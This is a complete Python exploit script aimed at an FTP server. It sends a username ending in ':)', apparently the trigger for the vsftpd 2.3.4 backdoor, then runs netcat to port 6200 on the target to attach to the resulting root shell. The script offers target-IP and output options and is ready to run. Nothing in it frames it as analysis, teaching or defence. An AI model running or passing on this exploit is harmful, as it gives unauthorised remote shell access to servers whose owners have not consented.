#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from os import system
from optparse import OptionParser as opt

def exploit(ip="127.0.0.1", disc=True, prnt=True):
	if(prnt):
		print("[?]Connecting to ftp server in {}".format(ip));
	try:
		ftp = socket(AF_INET, SOCK_STREAM);
		ftp.connect((ip, 21));
		ftp.send("USER letmein:)\n".encode());
		ftp.send("PASS pls\n".encode());
		if(disc):
			ftp.close();
	except:
		if(prnt):
			print("[-]An error has occured during ftp connection.");
		exit()
	else:
		if(prnt):
			print("[+]Connected correctly.");
		system("nc -vvn {} 6200".format(ip));
	finally:
		if(not disc):
			ftp.close();

def main():
	print("[!]This program requires Netcat installed in your computer.");
	o = opt("Usage: %prog [flags] [values]");
	o.add_option("-t", "--target", dest="ip", help="Set target's ip.", default="127.0.0.1");
	o.add_option("-p", "--dontprint", action="store_false", dest="prnt",default=True, help="If you use this, signs will not be printed.");
	o.add_option("-d", "--dontdisconnect", action="store_false", dest="disc",default=True, help="Active this to stay connected to the ftp server.");
	(op, argv) = o.parse_args();
	exploit(op.ip, op.disc, op.prnt);

if __name__ == '__main__':
	main()